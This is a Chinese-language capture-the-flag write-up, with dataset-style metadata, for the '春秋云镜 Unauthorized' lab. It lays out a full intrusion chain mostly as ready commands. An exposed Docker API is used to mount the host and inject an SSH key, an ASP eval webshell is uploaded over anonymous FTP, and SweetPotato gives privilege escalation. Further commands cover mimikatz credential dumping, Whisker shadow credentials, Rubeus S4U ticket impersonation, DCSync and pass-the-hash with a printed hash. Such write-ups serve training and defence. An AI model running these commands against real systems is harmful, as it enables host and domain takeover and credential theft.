---
title: 春秋云镜——Unauthorized WriteUp
contest: 春秋云镜靶场
year: 2022
difficulty: hard
vuln_type: auth_bypass
tags: [Docker未授权, SSH公钥注入, MySQL未授权, FTP匿名, ASP webshell, SweetPotato, mimikatz, Kerberos证书认证, Rubeus S4U, AD域]
attack_chain: Docker 2375未授权→启动ubuntu容器-v /:/mnt挂载宿主机→写root/.ssh/authorized_keys→SSH公钥登录→MySQL root/123456弱口令读flag→nmap扫内网→FTP匿名+ASP webshell→SweetPotato提权→mimikatz sekurlsa logonpasswords→Whisker添加DC02$机器证书→Rubeus asktgt + S4U2Self→mimikatz dcsync→wmiexec登录DC02读flag
key_payload: "docker -H tcp://47.92.205.41:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04;echo ssh-rsa ... > /mnt/root/.ssh/authorized_keys;mysql -uroot -p123456;ftp> put shell.asp;Whisker.exe add /target:DC02$ /dc:DC02.xiaorang.lab;Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:CIFS/DC02.xiaorang.lab /ptt"
one_liner: 春秋云镜Unauthorized：Docker 2375未授权+SSH公钥注入+ASP+证书委派Rubeus S4U
lesson: Docker daemon 2375未授权+AD CS证书+Whisker/Rubeus是经典域内权限提升组合
quality: high
---

# 春秋云镜——Unauthorized WriteUp

**靶场**：春秋云镜Unauthorized（高难，多flag）

**完整攻击链**：

**Flag1（边界机47.92.205.41）**：
- `docker -H tcp://47.92.205.41:2375 images` Docker daemon 2375未授权
- 启动ubuntu:18.04容器并挂载宿主机根目录：
  ```
  docker -H tcp://47.92.205.41:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
  ```
- 写root SSH公钥到`/mnt/root/.ssh/authorized_keys`
- SSH公钥登录宿主机root

**Flag2（内网172.22.7.67）**：
- `mysql -uroot -p123456` 弱口令 → secret库 f1agggg01表读flag
- nmap扫172.22.7.0/24 → 172.22.7.67(Win)
- FTP匿名登录 + 上传ASP webshell: `<%eval request("pass")%>`
- IIS 10.0 8081端口 公共办理平台
- SweetPotato提权到system

**Flag3（DC02 172.22.7.6）**：
- mimikatz `sekurlsa::logonpasswords full` 导出 zhangfeng/chenwei 域用户密码
- net user zhangfeng /domain 查看域用户
- **Whisker添加DC02$机器证书**：
  ```
  Whisker.exe add /target:DC02$ /domain:xiaorang.lab /dc:DC02.xiaorang.lab
  ```
- **Rubeus用证书申请TGT + S4U扩展**：
  ```
  Rubeus.exe asktgt /user:DC02$ /certificate:<base64证书> /dc:DC02.xiaorang.lab
  Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:CIFS/DC02.xiaorang.lab /ptt
  ```
- mimikatz dcsync导域管: `bf967c5a0f7256e2eaba589fbd29a382`
- `wmiexec.py -hashes :bf967c5a0f7256e2eaba589fbd29a382 Administrator@172.22.7.6`

**核心技术**：
- Docker daemon 2375未授权 + 容器挂载宿主机 + SSH公钥注入
- FTP匿名 + ASP webshell
- SweetPotato提权
- AD CS证书认证 (Whisker) + Rubeus S4U委派攻击

**质量评估**：高（命令级payload完整，证书+委派利用链详细）
